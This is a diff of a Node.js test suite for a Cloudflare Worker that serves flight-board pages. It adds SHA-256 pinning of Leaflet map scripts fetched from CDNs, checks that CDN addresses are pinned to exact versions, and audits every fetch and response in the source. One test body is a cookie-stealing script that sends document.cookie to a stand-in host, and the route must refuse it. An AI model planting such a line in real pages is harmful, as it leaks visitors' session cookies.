@@ -22,6 +22,11 @@
 //     X-Content-Type-Options: nosniff
 // and no route repeats the Content-Type an upstream states.
 //
+// One outside body is MEANT to run: the map engine, which the boards load
+// from /mapcdn with a script tag. No header makes a script inert, so that
+// route answers a file only when its SHA-256 is the one held in
+// worker-entry.js for an exact version, and 502 otherwise.
+//
 // These tests run the REAL handler, with fetch stubbed to play the upstream.
 // Nothing here is a real key, token or address of anyone else: the other
 // account, the other bucket and the key are made up.
@@ -31,6 +36,8 @@ const test = require('node:test');
 const assert = require('node:assert/strict');
 const fs = require('node:fs');
 const path = require('node:path');
+const crypto = require('node:crypto');
+const { pathToFileURL } = require('node:url');
 
 const ROOT = path.resolve(__dirname, '..');
 const rd = (p) => fs.readFileSync(path.join(ROOT, p), 'utf8');
@@ -53,8 +60,9 @@ let MOD = null;
  * The Worker in-process. `upstream(url, init)` plays every outside host and
  * returns a Response; each call is recorded with the headers it carried.
  */
-async function world(upstream, envExtra) {
+async function world(upstream, envExtra, other) {
   if (!MOD) MOD = await import(path.join(ROOT, 'worker-entry.js'));
+  const mod = other || MOD;
   const asked = [];
   const env = Object.assign({ ASSETS: { fetch: async () => new Response('asset', { status: 200, headers: { 'Content-Type': 'text/plain' } }) } }, envExtra || {});
   const ask = async (address) => {
@@ -67,7 +75,7 @@ async function world(upstream, envExtra) {
       return upstream(url, init);
     };
     try {
-      return await MOD.default.fetch(new Request(address, { headers: VISITOR }), env, { waitUntil() {} });
+      return await mod.default.fetch(new Request(address, { headers: VISITOR }), env, { waitUntil() {} });
     } finally { globalThis.fetch = real; }
   };
   return { ask, asked, env };
@@ -356,11 +364,10 @@ test('/citypic: a photograph for the weather card, inert as a page, under a phot
   assertInert(res, 'a kept copy with no type');
 });
 
-// ── the map engine and the installers: text, under a type fixed here ────────
+// ── the installers: text, under a type fixed here ──────────────────────────
 
-test('/mapcdn and the installers: the type is ours whatever the upstream states, and the answer is inert as a page', async () => {
-  for (const [p, type] of [['/mapcdn/leaflet.js', 'application/javascript'], ['/mapcdn/leaflet-arc.js', 'application/javascript'], ['/mapcdn/leaflet.css', 'text/css'],
-                           ['/a', 'text/plain; charset=utf-8'], ['/s', 'text/plain; charset=utf-8'], ['/t', 'text/plain; charset=utf-8'], ['/o', 'text/plain; charset=utf-8']]) {
+test('the installers: the type is ours whatever the upstream states, and the answer is inert as a page', async () => {
+  for (const [p, type] of [['/a', 'text/plain; charset=utf-8'], ['/s', 'text/plain; charset=utf-8'], ['/t', 'text/plain; charset=utf-8'], ['/o', 'text/plain; charset=utf-8']]) {
     for (const stated of ['text/html', 'image/svg+xml', 'application/javascript', '']) {
       const w = await world(plays(HTML, stated));
       const res = await w.ask('https://fids.orionconnected.com' + p);
@@ -371,15 +378,189 @@ test('/mapcdn and the installers: the type is ours whatever the upstream states,
       assertNothingPassedOn(w.asked);
     }
   }
+});
+
+// ── the map engine: the one outside body that is run as script ─────────────
+
+const sha = (body) => crypto.createHash('sha256').update(body).digest('hex');
+/** The two tables of worker-entry.js: where each engine file is asked for, and the SHA-256 its body must have. */
+const ENGINE = new Function(lift(ENTRY, 'const MAP_ENGINE = ') + ';\n' + lift(ENTRY, 'const MAP_ENGINE_SHA256 = ') + ';\nreturn { from: MAP_ENGINE, sha: MAP_ENGINE_SHA256 };')();
+/** The files of anyone else are not kept in the repository, so these stand in for them: made up, a few bytes each. */
+const STAND_IN = { 'leaflet.js': 'window.L = { made: "up" };\n', 'leaflet.css': '.leaflet-made-up { top: 0 }\n', 'leaflet-arc.js': 'L.made = "up";\n' };
+/**
+ * The Worker as it stands, with one change: the three constants are the
+ * SHA-256 of the stand-ins, so that the route can be seen answering a body
+ * it holds. The module is the source text of worker-entry.js, nothing else.
+ */
+let HOLDING = null;
+async function workerHoldingStandIns() {
+  if (HOLDING) return HOLDING;
+  let src = ENTRY.replace('from "./workers/fids-proxy.js"', () => 'from ' + JSON.stringify(pathToFileURL(path.join(ROOT, 'workers', 'fids-proxy.js')).href));
+  assert.notEqual(src, ENTRY, 'the one import of the entry');
+  for (const file of Object.keys(STAND_IN)) {
+    const held = "'" + ENGINE.sha[file] + "'";
+    assert.equal(src.split(held).length, 2, file + ': its constant is written once');
+    src = src.replace(held, () => "'" + sha(STAND_IN[file]) + "'");
+  }
+  HOLDING = await import('data:text/javascript;base64,' + Buffer.from(src).toString('base64'));
+  return HOLDING;
+}
+const ENGINE_FILES = [['leaflet.js', 'application/javascript'], ['leaflet-arc.js', 'application/javascript'], ['leaflet.css', 'text/css']];
+
+test('the map engine, in the source: an exact version in every address, one SHA-256 held for each file, and the same two on the designer page', async () => {
+  // where each file is asked for: the list, whole
+  assert.deepEqual(ENGINE.from, {
+    'leaflet.js': [
+      'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js',
+      'https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.js',
+      'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js'
+    ],
+    'leaflet.css': [
+      'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css',
+      'https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.css',
+      'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css'
+    ],
+    'leaflet-arc.js': [
+      'https://unpkg.com/leaflet-arc@1.0.2/bin/leaflet-arc.min.js',
+      'https://cdn.jsdelivr.net/npm/leaflet-arc@1.0.2/bin/leaflet-arc.min.js'
+    ]
+  });
+  // the rule the list obeys: a package at one exact version, never a range, a tag or nothing at all
+  const EXACT = /^https:\/\/(?:cdnjs\.cloudflare\.com\/ajax\/libs\/[a-z0-9-]+\/\d+\.\d+\.\d+\/|(?:cdn\.jsdelivr\.net\/npm|unpkg\.com)\/[a-z0-9-]+@\d+\.\d+\.\d+\/)[A-Za-z0-9._\/-]+$/;
+  const addresses = [].concat(...Object.values(ENGINE.from));
+  for (const a of addresses) assert.match(a, EXACT, a);
+  for (const floating of ['https://unpkg.com/leaflet-arc/bin/leaflet-arc.min.js', 'https://cdn.jsdelivr.net/npm/leaflet-arc/bin/leaflet-arc.min.js', 'https://unpkg.com/leaflet-arc@latest/bin/leaflet-arc.min.js',
+                          'https://unpkg.com/leaflet-arc@1/bin/leaflet-arc.min.js', 'https://unpkg.com/leaflet-arc@^1.0.2/bin/leaflet-arc.min.js', 'https://cdn.jsdelivr.net/npm/leaflet@1.9/dist/leaflet.js',
+                          'https://cdnjs.cloudflare.com/ajax/libs/leaflet/latest/leaflet.js', 'http://unpkg.com/leaflet-arc@1.0.2/bin/leaflet-arc.min.js']) {
+    assert.doesNotMatch(floating, EXACT, floating);
+  }
+  // one file, one version, on every host that serves it
+  for (const [file, list] of Object.entries(ENGINE.from)) {
+    assert.equal(new Set(list.map((a) => /(\d+\.\d+\.\d+)\//.exec(a)[1])).size, 1, file);
+    assert.ok(list.length >= 2, file + ': a second host, so that one CDN down is not a map down');
+  }
+  // the constants: one for each file served, 64 hex characters, no two alike
+  assert.deepEqual(Object.keys(ENGINE.sha).sort(), Object.keys(ENGINE.from).sort(), 'no file is served without a constant');
+  for (const [file, hex] of Object.entries(ENGINE.sha)) assert.match(hex, /^[0-9a-f]{64}$/, file);
+  assert.equal(new Set(Object.values(ENGINE.sha)).size, 3);
+  // the digest the route compares is SHA-256, written the way the constants are
+  const sha256Hex = new Function('crypto', lift(ENTRY, 'async function sha256Hex(') + '\nreturn sha256Hex;')(crypto.webcrypto);
+  for (const body of ['', 'abc', STAND_IN['leaflet.js'], HTML]) {
+    assert.equal(await sha256Hex(new TextEncoder().encode(body).buffer), sha(body), JSON.stringify(body));
+  }
+  assert.equal(await sha256Hex(new TextEncoder().encode('abc').buffer), 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
+  // two dozen more, so that bytes below 16 (written with their leading zero) are among them
+  for (let n = 1; n <= 24; n++) assert.equal(await sha256Hex(new TextEncoder().encode('pad ' + n).buffer), sha('pad ' + n));
+  // the route: the whole body is read, compared, and only then answered; the stream of the upstream is never handed on
+  const route = lift(ENTRY, "if (path.startsWith('/mapcdn/')) {");
+  assert.match(route, /const upstreams = Object\.prototype\.hasOwnProperty\.call\(MAP_ENGINE, file\) \? MAP_ENGINE\[file\] : null;\s*if \(!upstreams\) return new Response\('Not found', \{ status: 404, headers: NO_STORE \}\);/);
+  assert.match(route, /const want = Object\.prototype\.hasOwnProperty\.call\(MAP_ENGINE_SHA256, file\) \? MAP_ENGINE_SHA256\[file\] : '';\s*let refused = false;/);
+  assert.match(route, /const bytes = await r\.arrayBuffer\(\);\s*if \(!want \|\| \(await sha256Hex\(bytes\)\) !== want\) \{ refused = true; continue; \}\s*return new Response\(bytes, \{/);
+  assert.doesNotMatch(route, /r\.body|r\.text\(|return r\b/);
+  assert.match(route, /if \(refused\) return new Response\('Map engine body refused', \{ status: 502, headers: NO_STORE \}\);/);
   // the types a <script src> and a stylesheet are accepted under with nosniff
   assert.match(ENTRY, /const ct = file\.endsWith\('\.css'\) \? 'text\/css'\s*: file\.endsWith\('\.js'\)  \? 'application\/javascript'\s*: 'application\/octet-stream';/);
-  const w = await world(plays(HTML, 'text/html'));
-  assert.equal((await w.ask('https://fids.orionconnected.com/mapcdn/other.js')).status, 404, 'only the files listed');
-  assert.deepEqual(w.asked, []);
-  // the boards load the engine as scripts
+  // the boards load the engine from /mapcdn, as scripts
   for (const page of ['fids.html', 'gids.html', 'bids.html']) {
     const html = rd('fids-current/' + page);
     assert.match(html, /<script src="\/mapcdn\/leaflet\.js\?v=\d+"><\/script>\s*<script src="\/mapcdn\/leaflet-arc\.js\?v=\d+"><\/script>/, page);
+  }
+  // the designer page loads the same two straight from a public host: the same version, and the browser holds each to the same SHA-256
+  const sri = (file) => 'sha256-' + Buffer.from(ENGINE.sha[file], 'hex').toString('base64');
+  const designer = rd('fids-current/designer.html');
+  const tags = designer.match(/<script src="https:\/\/[^"]*"[^>]*><\/script>/g) || [];
+  assert.deepEqual(tags, [
+    '<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js" integrity="' + sri('leaflet.js') + '" crossorigin="anonymous"></script>',
+    '<script src="https://unpkg.com/leaflet-arc@1.0.2/bin/leaflet-arc.min.js" integrity="' + sri('leaflet-arc.js') + '" crossorigin="anonymous"></script>'
+  ]);
+  assert.ok(ENGINE.from['leaflet.js'].includes(/src="([^"]+)"/.exec(tags[0])[1]) && ENGINE.from['leaflet-arc.js'].includes(/src="([^"]+)"/.exec(tags[1])[1]), 'two of the addresses the route itself asks');
+  // and in the whole site: every address on one of the three public hosts names an exact version (the map files and the QR code drawer)
+  const found = new Set();
+  const walk = (dir) => {
+    for (const n of fs.readdirSync(path.join(ROOT, dir), { withFileTypes: true })) {
+      const rel = dir + '/' + n.name;
+      if (n.isDirectory()) walk(rel);
+      else if (/\.(js|html|css)$/.test(n.name)) for (const m of rd(rel).matchAll(/(?:https?:)?\/\/(?:[a-z0-9-]+\.)*(?:unpkg\.com|jsdelivr\.net|cdnjs\.cloudflare\.com)\/[^"'\s)<>]*/g)) found.add(m[0]);
+    }
+  };
+  walk('fids-current');
+  assert.deepEqual([...found].sort(), [
+    'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js',
+    'https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js',
+    'https://unpkg.com/leaflet-arc@1.0.2/bin/leaflet-arc.min.js'
+  ], 'a new script from a public host belongs in this list, at an exact version');
+  for (const a of found) assert.match(a, EXACT, a);
+});
+
+test('/mapcdn: a body that is not the one held is refused with 502, whatever it is; the one held is answered under our type, inert as a page', async () => {
+  // ── the Worker as it stands: nothing a stubbed upstream can say is the body of that exact version ──
+  for (const [file] of ENGINE_FILES) {
+    for (const [body, stated] of [[HTML, 'text/html'], [SVG, 'image/svg+xml'], ['fetch("https://example.com/?" + document.cookie)', 'application/javascript'], [STAND_IN[file], 'application/javascript'],
+                                   [STAND_IN[file], 'text/css'], ['', 'application/javascript'], ['Not found', '']]) {
+      const w = await world(plays(body, stated));
+      const res = await w.ask('https://fids.orionconnected.com/mapcdn/' + file);
+      assert.equal(res.status, 502, file + ' ' + JSON.stringify(stated));
+      assert.equal(await res.text(), 'Map engine body refused', 'our own words, never the body');
+      assert.equal(res.headers.get('Cache-Control'), 'no-store', 'and a refusal is not kept by any cache');
+      assert.doesNotMatch(res.headers.get('Content-Type') || '', /javascript|css|html|xml|svg/i);
+      assert.deepEqual(w.asked.map((a) => a.url), ENGINE.from[file], file + ': every host listed was asked, in order, before giving up');
+      assertNothingPassedOn(w.asked);
+    }
+  }
+  // no host answers at all: the fault it always was
+  for (const upstream of [plays('gone', 'text/plain', 404), plays(HTML, 'text/html', 500), async () => { throw new Error('unreachable'); }]) {
+    const w = await world(upstream);
+    const res = await w.ask('https://fids.orionconnected.com/mapcdn/leaflet-arc.js');
+    assert.deepEqual([res.status, await res.text(), res.headers.get('Cache-Control')], [503, 'Map engine fetch failed', 'no-store']);
+    assert.equal(w.asked.length, 2);
+  }
+  // one host down and the other with the wrong body: refused
+  let n = 0;
+  let w = await world(async () => (n++ === 0 ? answer('gone', 'text/plain', 404) : answer(HTML, 'application/javascript')));
+  assert.equal((await w.ask('https://fids.orionconnected.com/mapcdn/leaflet-arc.js')).status, 502);
+  // only the files listed, and no upstream for anything else
+  w = await world(plays(HTML, 'text/html'));
+  for (const other of ['other.js', 'leaflet-arc.min.js', 'leaflet.js/x', '', 'constructor', 'toString', '__proto__', 'hasOwnProperty']) {
+    assert.equal((await w.ask('https://fids.orionconnected.com/mapcdn/' + other)).status, 404, JSON.stringify(other));
+  }
+  assert.deepEqual(w.asked, [], 'only the files listed');
+
+  // ── the same source holding the SHA-256 of three stand-in bodies: the route answers what it holds ──
+  const holding = await workerHoldingStandIns();
+  for (const [file, type] of ENGINE_FILES) {
+    for (const stated of ['text/html', 'image/svg+xml', 'application/javascript', 'text/css; charset=utf-8', '']) {
+      w = await world(plays(STAND_IN[file], stated), null, holding);
+      const res = await w.ask('https://fids.orionconnected.com/mapcdn/' + file + '?v=22485');
+      assert.equal(res.status, 200, file);
+      assert.equal(res.headers.get('Content-Type'), type, file + ' when the upstream says ' + JSON.stringify(stated));
+      assertInert(res, file);
+      assert.equal(res.headers.get('Access-Control-Allow-Origin'), '*');
+      assert.equal(res.headers.get('Cache-Control'), 'public, max-age=86400');
+      assert.equal(await res.text(), STAND_IN[file], 'the bytes held, untouched');
+      assert.deepEqual(w.asked.map((a) => a.url), [ENGINE.from[file][0]], file + ' asks one fixed address');
+      assertNothingPassedOn(w.asked);
+    }
+    // one byte more, one byte less, another file of the three: not the body held
+    for (const near of [STAND_IN[file] + ' ', STAND_IN[file].slice(0, -1), STAND_IN[file].replace('up', 'UP'), STAND_IN[file === 'leaflet.js' ? 'leaflet-arc.js' : 'leaflet.js'], '\ufeff' + STAND_IN[file]]) {
+      w = await world(plays(near, 'application/javascript'), null, holding);
+      const res = await w.ask('https://fids.orionconnected.com/mapcdn/' + file);
+      assert.deepEqual([res.status, await res.text()], [502, 'Map engine body refused'], file + ' ' + JSON.stringify(near));
+      assert.equal(w.asked.length, ENGINE.from[file].length);
+    }
+    // the first host wrong (or down) and the next one right: the right one is answered
+    for (const first of [() => answer(HTML, 'application/javascript'), () => answer('gone', 'text/plain', 404), () => { throw new Error('unreachable'); }]) {
+      let k = 0;
+      w = await world(async () => (k++ === 0 ? first() : answer(STAND_IN[file], 'text/plain')), null, holding);
+      const res = await w.ask('https://fids.orionconnected.com/mapcdn/' + file);
+      assert.deepEqual([res.status, res.headers.get('Content-Type'), await res.text()], [200, type, STAND_IN[file]], file);
+      assert.deepEqual(w.asked.map((a) => a.url), ENGINE.from[file].slice(0, 2));
+    }
+  }
+  // what a board does with no arc file: the route is drawn as a straight line, and the map is still a map
+  assert.match(CORE, /try \{ a = L\.Polyline\.Arc\(from, to, opts\); \}\s*catch \(e\) \{ return L\.polyline\(\[from, to\], opts\)\.addTo\(map\); \}/);
+  assert.match(CORE, /\/\/ leaflet-arc is optional \(plain-line fallback exists\)/);
+  for (const f of ['fids-current/js/designer.js', 'fids-current/js/template-renderer.js']) {
+    assert.match(rd(f), /arc = \(L\.Polyline && typeof L\.Polyline\.Arc === 'function'\)\s*\? L\.Polyline\.Arc\(o, d, \{[^}]*\}\)\s*: L\.polyline\(/, f);
   }
 });
 
@@ -419,12 +600,25 @@ test('in the source: every outside fetch of the board Worker is one of these, an
   assert.match(ENTRY, /^const LOGO_TYPES = RASTER_TYPES\.concat\(\['image\/svg\+xml'\]\);$/m);
   // the image types are the ones the upload controls of the site accept
   assert.match(rd('fids-current/menu.html'), /accept="video\/mp4,video\/webm,image\/png,image\/jpeg,image\/webp,image\/gif,image\/svg\+xml,\.svg"/);
-  // every fetch of another host, by the route it belongs to
+  // every fetch( there is in the file, awaited or not, whoever is asked: the asset server, the bundled proxy, another host
+  const every = [...code.matchAll(/([\w.$\]'"]*)fetch\(([^,)]*)/g)].map((m) => m[1] + 'fetch(' + m[2]);
+  const outside = every.filter((f) => /^fetch\(/.test(f) && f !== 'fetch(request');
+  assert.deepEqual(every.filter((f) => outside.indexOf(f) < 0), [
+    'env.ASSETS.fetch(new Request(new URL(page + url.search',           // the homepage: our own asset server
+    'fetch(request',                                                     // the handler itself: async fetch(request, env, ctx)
+    'env.ASSETS.fetch(request',                                          // the homepage paths on another host
+    'proxy.fetch(request',                                               // the bundled proxy, through inert()
+    'env.ASSETS.fetch(request'                                           // everything else: static assets
+  ], 'every fetch( that is not of another host is one of these five');
+  assert.equal((code.match(/fetch\s*\(/g) || []).length, 17, 'and there are seventeen in all: a new one is counted here whatever it is called on');
+  assert.doesNotMatch(code, /[=(,:]\s*fetch\b(?!\()|(?<![.\w])fetch\s*[;,=)\]]|globalThis|\beval\b|new Function/, 'fetch is called by its name where it stands, and is not kept under another');
+  // every fetch of another host, by the route it belongs to; each one is awaited (its answer is read here, never returned as it is)
   const fetches = (code.match(/await fetch\(([^,)]*)/g) || []).map((f) => f.replace('await fetch(', ''));
+  assert.deepEqual(outside.map((f) => f.replace('fetch(', '')), fetches, 'no fetch of another host is returned unawaited');
   assert.match(fetches[0], /^'https:\/\/fids-proxy\.[a-z0-9-]+\.workers\.dev\/stream\/agent\.sh'$/, '/a: the installer script of our own proxy, one fixed address');
   assert.deepEqual(fetches.slice(1), [
     'src',                                                               // /s /t /o
-    'upstream',                                                          // /mapcdn
+    'upstream',                                                          // /mapcdn     (answered only when its SHA-256 is the one held)
     'sunUrl',                                                            // /wxsun      (the answer is rebuilt JSON)
     'u',                                                                 // /citypic    (the search: JSON, read here)
     'hit.largeImageURL',                                                 // /citypic    (the picture)
@@ -441,6 +635,33 @@ test('in the source: every outside fetch of the board Worker is one of these, an
   for (const m of code.matchAll(/new Response\((r\.body|body|bytes|hit\.value), \{([\s\S]*?)\}\);/g)) {
     assert.match(m[2], /\.\.\.INERT\b|picHead\(/, 'an outside body answered without INERT: new Response(' + m[1] + ', …)');
   }
+  // every answer built in the file is counted: a new route answers through one of them, and is seen here
+  assert.equal((code.match(/new Response\(/g) || []).length, 69, 'a new answer belongs in the tests above, and then in this count');
+  assert.doesNotMatch(code, /\bResponse\b(?!\(|\.redirect\()/, 'an answer is new Response( or the one redirect, spelled so');
+  // one redirect, and it stays on the origin it was asked on
+  assert.deepEqual(code.match(/Response\.redirect\([^;]*\);/g), ["Response.redirect(url.origin + page + '?' + query, 302);"]);
+  assert.match(code, /if \(!url\.search && \/\\\/\[\^\/\]\*=\[\^\/\]\*\$\/\.test\(path\)\) \{\s*const cut = path\.lastIndexOf\('\/'\);\s*const page = path\.slice\(0, cut\);\s*const query = path\.slice\(cut \+ 1\);\s*if \(page && query\.indexOf\('='\) !== -1\) \{\s*return Response\.redirect\(/);
+  // text/html is stated in two places only, both for a page of our own asset server: the homepage, and an HTML document of the site
+  assert.deepEqual(code.split('\n').filter((l) => /text\/html/i.test(l)).map((l) => l.trim()), [
+    "h.set('Content-Type', 'text/html; charset=utf-8');",
+    "|| (res.headers.get('Content-Type') || '').indexOf('text/html') !== -1;",
+    "h.set('Content-Type', 'text/html; charset=utf-8');"
+  ]);
+  // and every Content-Type an answer states is one of these: fixed here, or pinned (ct, type, f.type are checked above and in their own tests)
+  const stated = [...code.matchAll(/'Content-Type'[:,]\s*([^,\n}]+)/g)].map((m) => m[1].replace(/\);\s*$/, '').trim());
+  assert.equal(stated.length, 19);
+  assert.deepEqual([...new Set(stated)].sort(), [
+    "'application/json'", "'image/png'", "'text/html; charset=utf-8'", "'text/plain; charset=utf-8'",
+    "/^image\\/png\\b/i.test((obj.httpMetadata && obj.httpMetadata.contentType) || '') ? 'image/png' : 'image/jpeg'",
+    'ct', 'f.type', 'type'
+  ]);
+  const home = lift(ENTRY, 'async function homePage(');
+  assert.match(home, /const res = await env\.ASSETS\.fetch\(new Request\(new URL\(page \+ url\.search, url\.origin\), request\)\);/);
+  assert.equal((home.match(/text\/html/g) || []).length, 1);
+  assert.equal((code.match(/\bhomePage\(/g) || []).length, 2, 'defined, and called for the two homepage hosts only');
+  assert.match(code, /const home = homeRoute\(url\);\s*if \(home\) return homePage\(request, url, home, env\);/);
+  assert.match(code, /const res = await env\.ASSETS\.fetch\(request\);\s*const isHtml = path === '\/' \|\| path\.endsWith\('\/'\) \|\| path\.endsWith\('\.html'\)\s*\|\| \(res\.headers\.get\('Content-Type'\) \|\| ''\)\.indexOf\('text\/html'\) !== -1;\s*if \(isHtml\) \{\s*const h = new Headers\(res\.headers\);\s*h\.set\('Content-Type', 'text\/html; charset=utf-8'\);/,
+    'an asset is a page when its path or the asset server says so, and never otherwise');
   assert.match(code, /const picHead = \(type, age\) => \(\{ 'Content-Type': type, 'Cache-Control': 'public, max-age=' \+ age, 'Access-Control-Allow-Origin': '\*', \.\.\.INERT \}\);/);
   // a Content-Type read off an answer is never sent on as it is: it is pinned, or only looked at
   const reads = code.split('\n').filter((l) => /headers\.get\('Content-Type'\)/.test(l)).map((l) => l.trim());
